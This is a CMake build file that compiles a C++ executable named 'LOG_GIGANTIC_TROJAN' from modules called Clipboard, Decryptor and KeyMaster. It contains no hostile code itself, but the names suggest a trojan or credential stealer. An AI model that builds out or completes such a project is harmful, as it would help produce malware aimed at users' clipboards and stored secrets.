cmake_minimum_required (VERSION 3.8)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_INCLUDE_CURRENT_DIR ON)

set(CMAKE_AUTOUIC ON)
set(CMAKE_AUTOMOC ON)
set(CMAKE_AUTORCC ON)

set(PROJECT_SOURCES
        main.cpp
        Bin.cpp
        Clipboard.cpp
        Core.cpp
        Decryptor.cpp
        KeyMaster.cpp
        KeyMasterUtils.cpp
)

set(PROJECT_HEADERS
        Bin.h
        Clipboard.h
        Core.h
        Decryptor.h
        KeyMaster.h
        KeyMasterUtils.h
)

add_executable (LOG_GIGANTIC_TROJAN ${PROJECT_SOURCES} ${PROJECT_HEADERS})